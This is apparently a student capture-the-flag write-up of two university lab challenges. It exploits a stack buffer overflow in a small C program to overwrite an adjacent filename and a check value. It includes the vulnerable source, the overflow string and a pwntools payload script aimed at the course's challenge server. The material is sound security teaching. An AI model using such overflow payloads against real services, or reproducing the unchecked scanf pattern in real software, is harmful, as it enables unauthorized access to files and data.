# CTF 3 - Buffer Overflow

## Challenge 1

## 1. Reconnaissance

The CTF platform gave us a ZIP file with an executable (*program*), the source code (*main.c*) and a Python script (*exploit-example.py*); we were also told that there would be a server available at http://ctf-fsi.fe.up.pt:4003.
To connect to it, we had to either use the `netcat` shell program (`nc ctf-fsi.fe.up.pt 4003`) or run the Python script we were given (`python3 exploit-example.py`).

We then ran the `checksec --file=./program` command, which told us that:
- the file's architecture is x86 (Arch)
- there is no canary protecting the return address (Stack)
- the stack has execution permission (NX)
- the binary positions are not randomized (PIE)
- there are memory positions with read, write and execution permissions - stack (RWX)

***Note:*** *RELRO is an additional mitigation against ROP attacks that makes the addresses of some functions defined at the executable startup read-only.*

![checksec](images/buffer-overflow-ctf/checksec.png)

Obviously, the first thing we tried to do was to read the contents of *file.txt*, where the flag is stored; however, we found only a placeholder.

We then checked out the *mem.txt* file and...well, we weren't expecting that.

![head](images/buffer-overflow-ctf/armagheadon.png)
|:--:| 
| *We've seen this guy somewhere...* |

## 2. Searching for/Choosing a Vulnerability

We then turned our attention to the source code in *main.c*, where we were hoping to find a vulnerability that would allow us to retrieve the flag.

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%40s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```

Following this, we decided to check the contents of the *exploit-example.py* file.

```py
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"Tentar nao custa")
r.interactive()
```

Analyzing this, it seemed that *program* was the executable file of *main.c*. By taking another look at the C code, we identified a possible vulnerability.

```c
char meme_file[8] = "mem.txt\0";
char buffer[32];

printf("Try to unlock the flag.\n");
printf("Show me what you got:");
fflush(stdout);
scanf("%40s", &buffer);
```

Although the buffer has space for 32 bytes (the size of the ```char``` type is 1 byte), the program is reading 40 by using ```scanf("%40s", &buffer)``` and that overwrites the buffer by 8 bytes which, coincidentally, is the size of the ```meme_file``` array that contains the file to be accessed.

Taking this into account, all we had to do was to cause a buffer overflow; since ```meme_file``` and ```buffer``` are in contiguous positions in memory, we only had to overwrite the contents of the array holding the file's name.

## 3. Finding an Exploit

Since there were no security checks in the file, all we had to do was to write 32 "fodder" chars followed by the name of the file we wanted to access - in this case, *flag.txt*.

```ttttttttttttttttttttttttttttttttflag.txt```

## 4. Exploring the Vulnerability

Having found an exploit, all that was left for us to do was to run *program*

![server-request](images/buffer-overflow-ctf/request.png)

and then enter our string, retrieving the flag.

![flag](images/buffer-overflow-ctf/flag_1.png)


## Challenge 2

## 1. Reconnaissance

We were told that the second challenge would consist of a similar, yet slightly more challenging, task. This challenge was available in a server at http://ctf-fsi.fe.up.pt:4000, so we had to either use the `netcat` shell program run the challenge's Python script.

We then ran the `checksec --file=./program` command, confirming that the executable's permissions were the same as in Challenge 1.

## 2. Searching for/Choosing a Vulnerability

We then decided to take a look at *main.c* to check if any changes had been made to the program.

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[9] = "mem.txt\0\0";
    char val[4] = "\xef\xbe\xad\xde";
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%45s", &buffer);
    if(*(int*)val == 0xfefc2324) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 32, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

It seemed some changes had been made to patch the buffer overflow vulnerability we had exploited earlier.

```c
char meme_file[9] = "mem.txt\0\0";
char val[4] = "\xef\xbe\xad\xde";
char buffer[32];

printf("Try to unlock the flag.\n");
printf("Show me what you got:");
fflush(stdout);
scanf("%45s", &buffer);
if(*(int*)val == 0xfefc2324) {...}
```

In order to access the file, we had to make sure that ```val = 0xfefc2324``` - this meant that we would also have to overwrite the contents of ```val```.

## 3. Finding an Exploit

Just like in the first challenge, we tried to insert 32 "fodder" chars, this time followed by both ```\xef\xbe\xad\xde``` and the target file's name to verify what happened.

![rejected-input](images/buffer-overflow-ctf/rejected_input.png)

Both ```\xef``` and ```\xde``` weren't even read, so it seemed we had to find an alternative to exploiting the vulnerability through the terminal. 
While researching on the topic, we came across the ```pwnlib.util.packing``` module for packing and unpacking integers in the ```pwntools``` CTF framework/exploit development library. We started by using the ```u32``` function to check the actual value of ```\xef\xbe\xad\xde```.

![trick-value](images/buffer-overflow-ctf/trick_value.png)

By converting ```3735928559``` to hexadecimal, we got to the value of ```\xef\xbe\xad\xde``` - ```0xdeadbeef```.

Therefore, we modified the Python code in *exploit-example.py*, using the ```p32``` function to pack the ```0xfefc2324``` value; this would allow us to insert it in ```val``` while overwriting the contents of the arrays.

```py
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")

payload = b"tttttttttttttttttttttttttttttttt" + p32(0xfefc2324) + b"flag.txt"


r.sendline(payload)
r.interactive()
```

## 4. Exploring the Vulnerability

Having found a possible exploit, we ran the *exploit-example.py* script and got the flag.

![flag](images/buffer-overflow-ctf/flag_2.png)

***Note:*** *Challenge 1 could also have been solved similarly; the value of ```payload``` would have been ```b"ttttttttttttttttttttttttttttttttflag.txt"```*